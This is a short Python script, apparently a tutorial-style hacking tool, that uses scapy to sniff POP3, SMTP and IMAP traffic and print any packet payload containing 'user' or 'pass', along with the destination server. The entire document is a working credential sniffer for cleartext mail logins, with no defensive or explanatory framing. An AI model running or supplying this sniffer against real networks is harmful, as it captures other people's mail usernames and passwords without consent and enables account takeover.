from scapy.all import *


# Our packet callback
def packet_callback(pkt):

    if pkt[TCP].payload:
        mail_packet = str(pkt[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print("[*] Server:", pkt[IP].dst)
            print("[*]", pkt[TCP].payload)


# Fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
